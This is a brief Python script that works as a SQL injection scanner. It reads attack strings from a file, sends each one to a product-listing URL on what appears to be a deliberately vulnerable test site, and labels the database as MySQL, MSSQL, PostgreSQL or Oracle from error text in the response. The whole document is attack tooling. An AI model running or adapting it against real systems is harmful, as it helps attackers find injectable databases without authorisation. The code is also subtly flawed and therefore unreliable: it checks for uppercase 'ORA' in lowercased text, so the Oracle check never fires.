import requests
URL = 'http://testphp.vulnweb.com/listproducts.php?cat='
sql_payloads = []
with open('sql-attack-vector.txt', 'r') as file:
  sql_payloads = [line[:-1] for line in file.readlines()]

for payload in sql_payloads:
  print("Testing "+URL+payload)
  response = requests.post(URL+payload)
  if 'mysql' in response.text.lower():
    print('Injectable MySQL detected, attack string: ', payload)

  elif 'native client' in response.text.lower(): 
    print('Injectable MSSQL detected, attack string: ', payload)

  elif 'syntax error' in response.text.lower():
    print('Injectable PostGRES detected, attack string: ', payload)

  elif 'ORA' in response.text.lower():
    print('Injectable Oracle database detected, attack string: ', payload)

  else:
    print('Payload', payload, 'not injectable')